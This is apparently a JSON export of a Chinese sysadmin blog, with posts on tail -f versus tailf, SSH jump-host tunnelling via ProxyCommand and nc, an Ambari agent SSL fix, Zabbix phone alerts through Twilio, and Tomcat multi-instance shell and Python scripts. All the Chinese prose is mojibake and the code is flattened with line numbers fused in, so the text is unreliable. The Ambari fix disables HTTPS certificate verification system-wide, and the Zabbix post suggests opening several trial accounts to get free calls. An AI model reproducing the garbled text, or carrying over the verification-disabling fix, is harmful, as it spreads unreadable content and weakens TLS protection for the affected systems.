è°ƒç”¨ç³»ç»Ÿå‡½æ•°`fstat()`è·å–æ–‡ä»¶æè¿°ç¬¦ï¼Œ`lseek()`å‡½æ•°`SEEK_SET`æ–¹æ³•ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°æœ«å°¾ï¼Œä»æœ«å°¾`read()`è¿›è¡Œè¯»å– ç³»ç»Ÿå‡½æ•°å¯¹æ¯”ï¼š stat(),fstat()ç³»ç»Ÿå‡½æ•°ï¼š stat()ï¼šé€šè¿‡æ–‡ä»¶åè·å–æ–‡ä»¶ä¿¡æ¯ fstat()ï¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è·å–æ–‡ä»¶ä¿¡æ¯ä¸¤è€…åŒºåˆ«ï¼š è·å–æ–‡ä»¶ä¿¡æ¯æ–¹å¼ä¸åŒå®‰å…¨é—®é¢˜: å½“ä½¿ç”¨stat()è·å–æ–‡ä»¶å¹¶æ‰“å¼€å®ƒæ—¶ï¼Œæ–‡ä»¶å¯èƒ½ä¼šè¢«ä¿®æ”¹ï¼ˆæˆ–æƒé™è¢«æ›´æ”¹ï¼‰ï¼Œæˆ–è€…è¢«ç¬¦å·é“¾æ¥æ›¿ï¼Œfstat()é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚ 2. è°ƒç”¨å‡½æ•°ä¸åŒï¼Œå»¶ä¼¸å‡ºçš„åŒºåˆ«å¼€ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªçª—å£tailfæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªçª—å£æ“ä½œæ–‡ä»¶ [çª—å£1]>tailfï¼Œtail -f æ–‡ä»¶tailf test# æ‰§è¡Œrmï¼Œmv å‘½ä»¤åtailfé€€å‡ºæŸ¥çœ‹æ–‡ä»¶çŠ¶æ€tail -f test# æ‰§è¡Œmv å‘½ä»¤åtail -fç»§ç»­æŸ¥çœ‹æ–‡ä»¶ï¼Œ(æ–‡ä»¶åç§°æ”¹å˜ï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸å˜)# æ‰§è¡Œrm å‘½ä»¤åtailf -fç»§ç»­æŸ¥çœ‹æ–‡ä»¶ï¼Œé‡æ–°åˆ›å»ºç›¸åŒæ–‡ä»¶åä»ç„¶æ— æ³•æŸ¥çœ‹(å› ä¸ºæ–‡ä»¶çš„æè¿°ç¬¦å·²ç»æ”¹å˜) [çª—å£]2>æ›´æ”¹ï¼Œåˆ é™¤æ–‡ä»¶rm testmv test test.bakecho \"dddd\" &gt; test ç”±äºè·å–æ–‡ä»¶ä¿¡æ¯æ–¹å¼ä¸åŒ(staté€šè¿‡æ–‡ä»¶å,fstaté€šè¿‡æ–‡ä»¶æè¿°ç¬¦)ï¼Œå¯¼è‡´å½“æŸ¥çœ‹æ–‡ä»¶è¢«åˆ é™¤æ—¶ï¼Œtailfå¯ä»¥è·å–åˆ°æ–‡ä»¶è¢«åˆ é™¤ï¼Œtail -fè·å–ä¸åˆ°ã€‚ ç”±äºtail -fä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥å³ä½¿æŸ¥çœ‹è¿‡ç¨‹ä¸­æ–‡ä»¶åæ›´æ”¹tail -fä¾æ—§å¯ä»¥è·å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œè€Œtailf åˆ™æ— æ³•ç»§ç»­æŸ¥çœ‹æ–‡ä»¶ã€‚ å…±åŒç‚¹ï¼š æ‰“å°æ–‡ä»¶å10è¡Œï¼Œæ–‡ä»¶å¢é•¿è¯»å–æ–‡ä»¶ã€‚é€šè¿‡linuxstatå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼Œtailfå’Œtail -fé¦–æ¬¡è®¿é—®ä¼šæ”¹å˜æ–‡ä»¶è®¿é—®æ—¶é—´ï¼Œå¦‚æœæ–‡ä»¶æœªæ”¹å˜åˆ™ä¸ä¼šåˆ·æ–°æ–‡ä»¶è®¿é—®æ—¶é—´ï¼Œæ–‡ä»¶å†…å®¹æ”¹å˜ä¼šå†æ¬¡è®¿é—®æ–‡ä»¶å¹¶åˆ·æ–°æ–‡ä»¶è®¿é—®æ—¶é—´ã€‚ å‚è€ƒï¼šstat_and_fstattailftail","raw":null,"content":null,"categories":[{"name":"ErrorNote","slug":"ErrorNote","permalink":"https://kionf.com/categories/ErrorNote/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://kionf.com/tags/Linux/"}]},{"title":"æ··åˆäº‘é€šè¿‡SSHç½‘å…³è·³æ¿æœºéš§é“ç®¡ç†","slug":"ssh-forward","date":"2018-08-31T16:00:00.000Z","updated":"2018-10-31T10:19:28.323Z","comments":true,"path":"2018/09/01/ssh-forward/","link":"","permalink":"https://kionf.com/2018/09/01/ssh-forward/","excerpt":"\né€šè¿‡SSHç½‘å…³ä»£ç†ï¼Œè¿é€šæ··åˆäº‘ï¼Œé€šè¿‡å ¡å’æœºå·¥å…·æˆ–Ansibleç»Ÿä¸€ç®¡ç†ã€‚\n","text":"é€šè¿‡SSHç½‘å…³ä»£ç†ï¼Œè¿é€šæ··åˆäº‘ï¼Œé€šè¿‡å ¡å’æœºå·¥å…·æˆ–Ansibleç»Ÿä¸€ç®¡ç†ã€‚ 0x00 é—®é¢˜åˆ†æä»¥ä¸‹å†…å®¹AåŒºä»£è¡¨AWSï¼ŒBåŒºä»£è¡¨é˜¿é‡Œäº‘ã€‚å¹¶vpcå†…ç½‘ç»œäº’é€šï¼Œå¤–éƒ¨è®¿é—®åªèƒ½é€šè¿‡å ¡å’æœº å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒAåŒºä¸º172ç½‘æ®µï¼Œä¸”åªæœ‰ä¸€å°æœºå™¨å¯ä¾›å¤–ç½‘è®¿é—®ï¼Œä¸”æ­¤æœºå™¨ä¸ºç°æœ‰Ansibleå ¡å’æœºã€‚ç°åœ¨æ–°åŠ å…¥BåŒºæœºå™¨éœ€è¦ç®¡ç†ï¼ŒBåŒºä¹Ÿåªæä¾›ä¸€å°ä¸“ç”¨SSHç½‘å…³è·³æ¿æœºä¾›å¤–ç½‘è®¿é—®ã€‚ éœ€æ±‚ï¼šBåŒºéœ€è¦ä½¿ç”¨AåŒºå·²æœ‰Ansibleå ¡å’æœºï¼Œé€šè¿‡BåŒºæä¾›çš„ä¸“ç”¨SSHè·³æ¿æœºç›´æ¥ç®¡ç†BåŒºæ‰€æœ‰æœºå™¨ã€‚ è¿™é‡Œéœ€è¦ä½¿ç”¨SSHï¼ŒProxyCommandä»£ç†éš§é“åŠŸèƒ½ï¼Œæ¥å®ç°SSHè·³æ¿æœº 0x01 é…ç½®é€šè¿‡ä¿®æ”¹SSHé…ç½®æ¥æŒ‡å®šSSHéš§é“ä»£ç† vim ~/.ssh/config12345678910111213141516171819Host jumpserver User root # ç™»å½•åˆ°BåŒºsshè·³æ¿æœºç”¨æˆ· Hostname 36.22.13.140 # BåŒºè·³æ¿æœºIP IdentityFile ~/.ssh/id_rsa # sshè·³æ¿æœºsshå…å¯†key # è¿æ¥ä¸»æœºåï¼Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ ProxyCommand none # ç¦ç”¨å¯†ç æŸ¥è¯¢ã€‚æ­¤é€‰é¡¹åœ¨è„šæœ¬å’Œå…¶ä»–æ²¡æœ‰ç”¨æˆ·æä¾›å¯†ç çš„æ‰¹å¤„ç†ä½œä¸šä¸­å¾ˆæœ‰ç”¨ BatchMode yes #åŒ¹é…ä»¥ä¸‹hostè§„åˆ™ï¼Œåˆ™é€šè¿‡ä¸Šé¢çš„ jumpserver sshä»£ç†éš§é“è¿æ¥ Host 192.168.11.* # ä¿æŒè¿æ¥ï¼Œæ¯30så‘é€å¿ƒè·³ ServerAliveInterval 30 TCPKeepAlive yes IdentityFile ~/.ssh/id_rsa # BåŒºæœºå™¨sshå…å¯†key ProxyCommand ssh -qay jumpserver 'nc %h %p' # é‡å¤ä½¿ç”¨å·²å­˜åœ¨çš„è¿æ¥å¥—æ¥å­— ControlMaster auto BåŒºSSHè·³æ¿æœºéœ€è¦å®‰è£…ncå‘½ä»¤ å®‰è£…net-toolsyum -y install net-tools æ³¨ï¼šå¦‚æœBåŒºSSHç½‘å…³è·³æ¿æœºä¸æƒ³ä½¿ç”¨ncå‘½ä»¤ï¼Œéœ€è¦æ›´æ”¹ProxyCommand ssh -qay jumpserver &#39;nc %h %p&#39;ä¸ºProxyCommand ssh -W jumpserver %h:%p` AåŒºå ¡å’æœºé…ç½®åˆ°BåŒºæœºå™¨sshå…å¯† å…¶ä»–æœºå™¨è‡ªè¡Œé…ç½®,è¿™é‡Œçœç•¥1ssh-copy-id root@36.22.13.140 0x02 è¿æ¥æµ‹è¯•åœ¨AåŒºå ¡å’æœºç›´æ¥ï¼Œä½¿ç”¨sshè¿æ¥BåŒº192.168.11.*çš„æœºå™¨ è¿æ¥æœºå™¨12345ssh root@192.168.11.4root@JumpServer[15:47].ssh:$ ssh 192.168.11.4Last login: Sat Sep 8 15:47:02 2018 from 192.168.11.3root@nginx-4[15:47]~:$ æˆåŠŸé€šè¿‡BåŒºSSHç½‘å…³è·³æ¿æœºï¼Œè¿æ¥ç®¡ç†BåŒºå†…ç½‘æœºå™¨ã€‚æµ‹è¯•ç›´æ¥ä½¿ç”¨ansibleä¹Ÿå¯ç®¡ç†ã€‚ è‡³æ­¤ï¼Œä½¿ç”¨SSHç½‘å…³è·³æ¿æœºç®¡ç†æ··åˆäº‘ä»¥é…ç½®å®Œæˆ 0x03 æ€»ç»“ é€šè¿‡ BåŒºSSHç½‘å…³ æ¥è¿æ¥å†…éƒ¨VPCæœºå™¨ï¼ŒSSHé™¤äº†äººä»¬ç†Ÿæ‚‰å¸¸è§çš„ç™»é™†ç®¡ç†è¿œç¨‹çš„linuxä¸»æœºæ„å¤–åº”ç”¨è¿˜æœ‰å¾ˆå¤šï¼Œsshçš„ç½‘ç»œè½¬å‘éš§é“å¾ˆå¼ºå¤§ã€‚ æ¨èé˜…è¯»ï¼šsshç«¯å£è½¬å‘ å‚è€ƒï¼š ssh-proxycommandssh_config_man","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"https://kionf.com/categories/Linux/"},{"name":"SSH","slug":"Linux/SSH","permalink":"https://kionf.com/categories/Linux/SSH/"}],"tags":[{"name":"SSH","slug":"SSH","permalink":"https://kionf.com/tags/SSH/"}]},{"title":"Ambariæ˜¾ç¤ºHeartbeatæŠ¥é”™","slug":"bigdata-ambari","date":"2018-08-29T16:00:00.000Z","updated":"2018-10-31T10:19:28.283Z","comments":true,"path":"2018/08/30/bigdata-ambari/","link":"","permalink":"https://kionf.com/2018/08/30/bigdata-ambari/","excerpt":"\nå¯åŠ¨Ambari web ç•Œé¢æ˜¾ç¤ºæœåŠ¡Heartbeat Lost,  æŸ¥çœ‹Ambari agentæ—¥å¿—æŠ¥é”™\n","text":"å¯åŠ¨Ambari web ç•Œé¢æ˜¾ç¤ºæœåŠ¡Heartbeat Lost, æŸ¥çœ‹Ambari agentæ—¥å¿—æŠ¥é”™ 0x00AgentæŠ¥é”™å¦‚ä¸‹/var/log/ambari-agent/ambari-agent.logERROR 2015-09-23 09:47:07,402 NetUtil.py:77 - [Errno 8] _ssl.c:492: EOF occurred in violation of protocolERROR 2015-09-23 09:47:07,402 NetUtil.py:78 - SSLError: Failed to connect. Please check openssl library versions.Refer to: https://bugzilla.redhat.com/show_bug.cgi?id=1022468 for more details.WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds...WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds... 0x01è§£å†³åŠæ³•1. é…ç½®Ambari-agentå¼ºåˆ¶httpsç‰ˆæœ¬ä¸ºTLSv1_2ç¼–è¾‘/etc/ambari-agent/conf/ambari-agent.iniã€‚ æ­¤ä¸ºsedæ·»åŠ å‘½ä»¤sed -i /\\[security\\]/a\\/force_https_protocol=PROTOCOL_TLSv1_2 /etc/ambari-agent/conf/ambari-agent.ini åœ¨[security]åæ·»åŠ å¦‚ä¸‹å†…å®¹: /etc/ambari-agent/conf/ambari-agent.ini123456789[security]force_https_protocol=PROTOCOL_TLSv1_2keysdir=/var/lib/ambari-agent/keysserver_crt=ca.crtpassphrase_env_var_name=AMBARI_PASSPHRASEssl_verify_cert=0credential_lib_dir=/var/lib/ambari-agent/cred/libcredential_conf_dir=/var/lib/ambari-agent/cred/confcredential_shell_cmd=org.apache.hadoop.security.alias.CredentialShell 2. æ›´æ”¹pythoné…ç½®å…³é—­httpséªŒè¯ç¼–è¾‘/etc/python/cert-verification.cfg æ›´æ”¹ä¸ºverify=disable æ­¤ä¸ºsedæ›´æ”¹å‘½ä»¤sed -i 's/verify=.*/verify=disable/g' /etc/python/cert-verification.cfg /etc/python/cert-verification.cfg123[https]verify=platform_defaultverify=disable 0x02 é‡å¯agentservice ambari-agent restart è§£å†³ 0x03 åŸå› ç”±äºambari server ç«¯ä½¿ç”¨JDK1.7å¯åŠ¨ï¼Œ ä¸opensslå­˜åœ¨Bugï¼Œ æ›´æ”¹å¦‚ä¸Šé…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹sslç‰ˆæœ¬ï¼Œå…³é—­python httpsæ ¡éªŒ.","raw":null,"content":null,"categories":[{"name":"ErrorNote","slug":"ErrorNote","permalink":"https://kionf.com/categories/ErrorNote/"}],"tags":[{"name":"Ambari","slug":"Ambari","permalink":"https://kionf.com/tags/Ambari/"}]},{"title":"Zabbixç”µè¯æŠ¥è­¦","slug":"zabbix-alarm-phone","date":"2018-07-05T16:00:00.000Z","updated":"2018-10-31T10:19:28.327Z","comments":true,"path":"2018/07/06/zabbix-alarm-phone/","link":"","permalink":"https://kionf.com/2018/07/06/zabbix-alarm-phone/","excerpt":"Zabbix ä½¿ç”¨ twilio è¿›è¡Œå…è´¹ç”µè¯æŠ¥è­¦, å…é™¤ä¼ä¸šè®¤è¯ç¹çæ­¥éª¤\n","text":"Zabbix ä½¿ç”¨ twilio è¿›è¡Œå…è´¹ç”µè¯æŠ¥è­¦, å…é™¤ä¼ä¸šè®¤è¯ç¹çæ­¥éª¤ 0x00 æ³¨å†Œ twilio è·å– api è°ƒç”¨key1. æ³¨å†Œè´¦å· æ³¨å†Œåœ°å€ Twilio-SignUp éœ€è¦ç¿»å¢™ å¯†ç è‡³å°‘14ä¸ªå­—ç¬¦ï¼Œä¸éœ€è¦ç‰¹æ®Šå­—ç¬¦ é€šè¿‡å é€‰æ‹©ä¸­å›½åŒº, éªŒè¯æ‰‹æœºå· åˆ›å»ºé¡¹ç›®åç§°(éšä¾¿å†™) 2. è·å–ç½‘ç»œå·ç  åˆå§‹é…ç½®åœ°å€ é€‰æ‹©å¦‚ä¸‹é€‰é¡¹: è®°ä½è¿™ä¸ªå·ç ç»“æœ+18652052853åæœŸä¼šä½¿ç”¨ åˆ°æ­¤å°±ä¸ç”¨ç»§ç»­èµ°å‰©ä¸‹çš„å‡ æ­¥äº† å…¶ä»–è‡ªå®šä¹‰ç”µè¯è®¾ç½®(é»˜è®¤ä¸éœ€è¦é…ç½®) 0x01 ç¼–è¾‘zabbixè°ƒç”¨APIè„šæœ¬ è·å–API_Keyåœ°å€ Dashboard &gt;&gt; Settings &gt;&gt; General è·å–ACCOUNT SID, AUTH TOKEN æ³¨æ„: è¯•ç”¨è´¦å·åªèƒ½æ‰“ç»™ æ³¨å†Œæ—¶ä½¿ç”¨çš„æ‰‹æœºå·!! æ›´æ”¹æ–‡ä»¶å±ä¸»åŠæƒé™chown zabbix:zabbix &amp;&amp; chmod +x zabbix_phone.py zabbix/alertscripts/zabbix_phone.py12345678910111213141516171819# -*- coding: utf-8 -*-#!/usr/bin/env pythonfrom twilio.rest import Client# Your Account Sid and Auth Token from twilio.com/consoleaccount_sid = 'your_sid'auth_token = 'your_token'client = Client(account_sid, auth_token)call = client.calls.create( url='https://demo.twilio.com/welcome/voice/', #æ³¨å†Œä½¿ç”¨çš„æ‰‹æœºå· to='+8611111', #ä¸Šé¢è·å–åˆ°çš„ç½‘ç»œç”µè¯å·ç  from_='+19387770820' )print(call.sid) æ‰§è¡Œæ–‡ä»¶æµ‹è¯•, è¿”å›ä¸€æ®µidè¡¨ç¤ºæˆåŠŸ, æ¥åˆ°ç”µè¯ 0x02 é…ç½®zabbix1. æ·»åŠ æŠ¥è­¦åª’ä»‹ 2. è¿æ¥åˆ°ç”¨æˆ· 3. æ·»åŠ åˆ°åŠ¨ä½œ è‡³æ­¤zabbixç”µè¯æŠ¥è­¦é…ç½®å®Œæˆ, å¦‚æœéœ€è¦å…è´¹æ‰“ç»™å¤šä¸ªç”¨æˆ·, å¯ä»¥æ³¨å†Œå¤šä¸ªè´¦å·,æ·»åŠ å¤šä¸ªåª’ä»‹ ç„¶å ç»‘å®šåˆ°åŒä¸€ä¸ªåŠ¨ä½œä¸­.","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"Zabbix","slug":"è‡ªåŠ¨åŒ–è¿ç»´/Zabbix","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/Zabbix/"}],"tags":[{"name":"Zabbix","slug":"Zabbix","permalink":"https://kionf.com/tags/Zabbix/"}]},{"title":"Tomcatå•æœºå¤šå®ä¾‹éƒ¨ç½²åŠç®¡ç†","slug":"tomcat-multiple","date":"2018-06-27T16:00:00.000Z","updated":"2018-10-31T10:19:28.323Z","comments":true,"path":"2018/06/28/tomcat-multiple/","link":"","permalink":"https://kionf.com/2018/06/28/tomcat-multiple/","excerpt":"\nå•å°æœºå™¨éƒ¨ç½²å¤šä¸ª Tomcat, æ¯ä¸ªTomcatéƒ¨ç½²ç‹¬ç«‹æœåŠ¡,Tomcatä¹‹é—´å¯åœäº’ä¸å½±å“\n","text":"å•å°æœºå™¨éƒ¨ç½²å¤šä¸ª Tomcat, æ¯ä¸ªTomcatéƒ¨ç½²ç‹¬ç«‹æœåŠ¡,Tomcatä¹‹é—´å¯åœäº’ä¸å½±å“ ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆæœ‰è¿™ä¸ªéœ€æ±‚, å¤åˆ¶ç²˜è´´å°±æ˜¯å¹² 0x00 å•æœºå¤šå®ä¾‹æ¦‚è¿° å¤§æ¦‚çš„ç›®å½•ç»“æ„: CATALINA_HOME ä¸ºTomcatåº”ç”¨ç¨‹åºè¿è¡Œç¨‹åºåŠæ‰€éœ€ä¾èµ– CATALINA_BASE å³æˆ‘ä»¬å³å°†éƒ¨ç½²çš„ç¨‹åº æ‰‹åŠ¨æ›´æ”¹å¦‚ä¸‹å·¥ä½œç›®å½•: è¿™æ˜¯æˆ‘è‡ªå·±ä¸ªå„¿æ•´çš„åˆå§‹ç›®å½•ç»“æ„ download12345678910war_apps #æ‰‹åŠ¨åˆ›å»ºç”¨æ¥å­˜æ”¾ä¸‹è½½å¥½çš„waråŒ…æ–‡ä»¶tomcat #CATALINA_HOMEâ”œâ”€â”€ binâ”œâ”€â”€ INIT_APPS_FILE #CATALINA_BASEâ”‚ â”œâ”€â”€ confâ”‚ â”œâ”€â”€ logsâ”‚ â”œâ”€â”€ tempâ”‚ â”œâ”€â”€ webappsâ”‚ â””â”€â”€ workâ””â”€â”€ lib ç„¶åå‘¢æ­£å¸¸çš„æ€è·¯å°±æ˜¯é…ç½®æ¯ä¸ªAPPçš„server.xmlç«¯å£: 1234- Server Portï¼šè¯¥ç«¯å£ç”¨äºç›‘å¬å…³é—­tomcatçš„shutdownå‘½ä»¤ï¼Œé»˜è®¤ä¸º8005- Connector Portï¼šè¯¥ç«¯å£ç”¨äºç›‘å¬HTTPçš„è¯·æ±‚ï¼Œé»˜è®¤ä¸º8080- AJP Portï¼šè¯¥ç«¯å£ç”¨äºç›‘å¬AJPï¼ˆ Apache JServ Protocol ï¼‰åè®®ä¸Šçš„è¯·æ±‚ï¼Œé€šå¸¸ç”¨äºæ•´åˆApache Serverç­‰å…¶ä»–HTTPæœåŠ¡å™¨ï¼Œé»˜è®¤ä¸º8009- Redirect Portï¼šé‡å®šå‘ç«¯å£ï¼Œå‡ºç°åœ¨Connectoré…ç½®ä¸­ï¼Œå¦‚æœè¯¥Connectorä»…æ”¯æŒéSSLçš„æ™®é€šhttpè¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥ç«¯å£ä¼šæŠŠ https çš„è¯·æ±‚è½¬å‘åˆ°è¿™ä¸ªRedirect PortæŒ‡å®šçš„ç«¯å£ï¼Œé»˜è®¤ä¸º8443ï¼› åº”ç”¨å¤ªå¤šä½ éš¾é“è¦ä¸€ä¸ªä¸ªæ‰‹åŠ¨æ”¹? no no no! ä¸Šè„šæœ¬ 0x01 è‡ªåŠ¨éƒ¨ç½²ç®¡ç†é…ç½®éœ€è¦æŠŠåº”ç”¨waråŒ…ä¼ åˆ°å¯ä¸‹è½½ä½ç½®,æ¥ç”¨äºåº”ç”¨åˆ†å‘,æˆ‘è¿™é‡Œæ˜¯ç›´æ¥ä¼ åˆ°äº†é˜¿é‡Œäº‘çš„ossæ¡¶é‡Œ 1.æ·»åŠ tomcatæ›´æ–°å¯åœæ§åˆ¶è„šæœ¬éœ€è¦å®‰è£…unzip yum -y install unzip manage.shéœ€è¦æ”¾åœ¨è¿™é‡Œ,ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æ”¹ä»£ç 1234567891011war_apps #æ‰‹åŠ¨åˆ›å»ºç”¨æ¥å­˜æ”¾ä¸‹è½½å¥½çš„waråŒ…æ–‡ä»¶tomcat #CATALINA_HOMEâ”œâ”€â”€ binâ”œâ”€â”€ manage.shâ”œâ”€â”€ INIT_APPS_FILE #CATALINA_BASEâ”‚ â”œâ”€â”€ confâ”‚ â”œâ”€â”€ logsâ”‚ â”œâ”€â”€ tempâ”‚ â”œâ”€â”€ webappsâ”‚ â””â”€â”€ workâ””â”€â”€ lib è“è‰²å—éœ€è¦æ ¹æ®å®é™…æƒ…å†µè‡ªå®šä¹‰, åº”ç”¨åç§°, å’ŒwaråŒ…ä¸‹è½½åœ°å€ä¸éœ€è¦å†™,åé¢çš„pythonæ€»æ§åˆ¶å°ä¼šè‡ªåŠ¨åˆ†é… manage.sh123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/bin/sh# Author: Kionf# description: å¯åŠ¨tomcatå¤šå®ä¾‹.# PATH=/opt/op/java/jdk1.8.0_172/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin# åº”ç”¨åç§°app=# waråŒ…ä¸‹è½½åœ°å€war_url=soft_dir=\"/opt/op\"download_war_file=\"$&#123;soft_dir&#125;/war_apps/$&#123;app&#125;.war\"export CATALINA_BASE=\"$&#123;soft_dir&#125;/tomcat/$app\"export CATALINA_HOME=\"$&#123;soft_dir&#125;/tomcat\"export JVM_OPTIONS=\"-Xms528m -Xmx812m -Xmn328m\"[ -d \"$&#123;soft_dir&#125;/war_apps\" ] || mkdir $&#123;soft_dir&#125;/war_apps[ `which unzip` ] || yum -y -q install unzip &gt;/dev/null 2&gt;&amp;1check()&#123; PID=`ps aux|grep java|grep -w $&#123;CATALINA_BASE&#125;|awk '&#123;print $2&#125;'` if [ -n \"$PID\" ];then echo -e \"\\033[94m $app is running PID:$PID\" running=`netstat -ntlp|grep $PID|grep 127.0.0.1` if [ -n \"$running\" ];then echo -e \"\\033[92m $app is provide services\\033[0m \" else echo -e \"\\033[93m $app is running but not provide services\\033[0m\" fi return 0 else echo -e \"\\033[91m $app is dead\\033[0m \" return 1 fi&#125;start() &#123; check if [ $? -eq 1 ];then echo -e \"\\033[94m Start $app \\033[0m\" $CATALINA_HOME/bin/startup.sh &gt;/dev/null 2&gt;&amp;1 fi&#125;stop() &#123; check if [ $? -eq 0 ];then echo -e \"\\033[94m Stop $app\\033[0m\" $CATALINA_HOME/bin/shutdown.sh &gt;/dev/null 2&gt;&amp;1 kill -9 $PID fi&#125;update() &#123; echo \"ä¸‹è½½æ–‡ä»¶\" wget $&#123;war_url&#125; -O $&#123;download_war_file&#125; &gt; /dev/null 2&gt;&amp;1 if [ $? -eq 0 ];then cd $&#123;CATALINA_BASE&#125;/webapps/*/; unzip -q -o $&#123;download_war_file&#125; &gt;/dev/null 2&gt;&amp;1 fi&#125;log() &#123; tailf $&#123;CATALINA_BASE&#125;/logs/catalina.out&#125;if [ $# != \"0\" ];then case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; status) check ;; upgrade) stop update start ;; log) log ;; *) echo $\"Usage: $0 &#123;start|stop|restart|status|upgrade|log&#125;\" exit 1 ;; esacelse start logfi 2.æ·»åŠ æ€»æ§åˆ¶å°è„šæœ¬ æˆ‘å°±æ”¾åœ¨äº†/usr/local/binä¸‹, chmod +x /usr/local/bin/tomcat_manager è“è‰²éƒ¨åˆ†éœ€è¦æ ¹æ®è‡ªå·±éœ€æ±‚æ›´æ”¹ (æ”¯æŒpython2) /usr/local/bin/tomcat_manager123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#! /usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2018/5/23 15:18# @Author : Kionf# @FileName: tomcat_manager.py## åˆå§‹é…ç½®å¹¶ç®¡ç†å•ä¾‹tomcatå¤šåº”ç”¨#import osimport subprocessimport sysimport shutil# PATH = os.getcwd()PATH = \"/opt/op/tomcat\" #Tomcatç›®å½•shell_script = os.path.join(PATH, \"manage.sh\") #æ›´æ–°å¯åœç®¡ç†è„šæœ¬INIT_FILES = os.path.join(PATH, \"INIT_APPS_FILE\")bucket = \"https://oss.aliyuncs.com/tomcat_app/\" # webappä¸‹è½½åœ°å€config_data = &#123; # åº”ç”¨å: [ServerPort, ConnectPort, AJPPort, RedirectPort, ] 'Application': ['8201', '8101', '8301', '8401', 'BaseApplication.war'], 'BaseNotify_Service': ['8202', '8102', '8302', '8402', 'BaseNotify_Service.war'], 'BaseUserCenter_Service': ['8203', '8103', '8303', '8403', 'BaseUserCenter_Service.war'],&#125;def customize_print(msg, stat=0): if stat == 1: print(\"\\033[91m [ERROR]: %s \\033[0m\" % msg) elif stat == 0: print(\"\\033[92m [INFO]: %s \\033[0m\" % msg) elif stat == 2: print(\"\\033[93m [DEBUG]: %s \\033[0m\" % msg)class TomcatAppsManage: def __init__(self, webapp): self.name = webapp self.app_config = config_data[self.name] self.manage_shell_file = os.path.join(PATH, self.name, self.name) self.server_port, self.conn_port, self.ajp_port, self.redirect_port, self.app_war_name = self.app_config self.app_download_url = bucket + self.app_war_name self.config_file = os.path.join(PATH, self.name, 'conf/server.xml') self.webapp_dir = os.path.join(PATH, self.name) def create_app(self): \"\"\" åˆ›å»ºapp :return: \"\"\" if not os.path.exists(self.webapp_dir): customize_print(\"åˆ›å»ºAPP: %s\" % self.name) shutil.copytree(INIT_FILES, self.webapp_dir) os.mkdir(os.path.join(self.webapp_dir, \"webapps\", self.name.lower())) def config_app_port(self): customize_print(\"æ­£åœ¨ä¿®æ”¹APPï¼š%s é…ç½®\" % self.name) change_port = &#123; 'ServerPort': \"sed -i s'#Server port=\\\"[0-9]*\\\"#Server port=\\\"\" + self.server_port + \"\\\"#'g \" + self.config_file, 'ConnPort': \"sed -i s'#Connector port=\\\"[0-9]*\\\" protocol=\\\"HTTP/1.1\\\"#Connector port=\\\"\" + self.conn_port + \"\\\" protocol=\\\"HTTP/1.1\\\"#'g \" + self.config_file, 'RedirectPort': \"sed -i s'#redirectPort=\\\"[0-9]*\\\"#redirectPort=\\\"\" + self.redirect_port + \"\\\"#'g \" + self.config_file, 'AjpPort': \"sed -i s'#Connector port=\\\"[0-9]*\\\" protocol=\\\"AJP/1.3\\\"#Connector port=\\\"\" + self.ajp_port + \"\\\" protocol=\\\"AJP/1.3\\\"#'g \" + self.config_file, &#125; for port in change_port.keys(): # customize_print(\"ä¿®æ”¹ %s ç«¯å£\" % port) os.system(change_port[port]) def config_app_manage_shell(self): customize_print(\"%s æ·»åŠ ç®¡ç†è„šæœ¬\" % self.name) copy_shell_script = 'cp -f ' + shell_script + ' ' + self.manage_shell_file os.system(copy_shell_script) config_script_app_name = \"sed -i 's/app=/app=\\\"\" + self.name + \"\\\"/' \" + self.manage_shell_file os.system(config_script_app_name) config_script_war_url = \"sed -i 's#war_url=#war_url=\\\"\" + self.app_download_url + \"\\\"#' \" + self.manage_shell_file os.system(config_script_war_url) def status_app(self): \"\"\" :return: 0æä¾›æœåŠ¡ï¼Œ1åœæ­¢ï¼Œ2æœªæä¾›æœåŠ¡ \"\"\" try: result = subprocess.check_output(['sh', self.manage_shell_file, 'status']) except subprocess.CalledProcessError as e: result = e.output if 'run' in result: if 'is provide services' in result: customize_print(\"åº”ç”¨ %s æˆåŠŸå¯åŠ¨å¹¶æä¾›æœåŠ¡\" % self.name) return 0 elif 'but' in result: customize_print(\"åº”ç”¨ %s è¿›ç¨‹å­˜åœ¨ä½†æœªæä¾›æœåŠ¡\" % self.name, 2) return 2 else: customize_print(\"åº”ç”¨ %s ä»¥åœæ­¢\" % self.name, 1) return 1 def manage(self, operate): os.system('sh %s %s' % (self.manage_shell_file, operate)) def init(self): self.create_app() 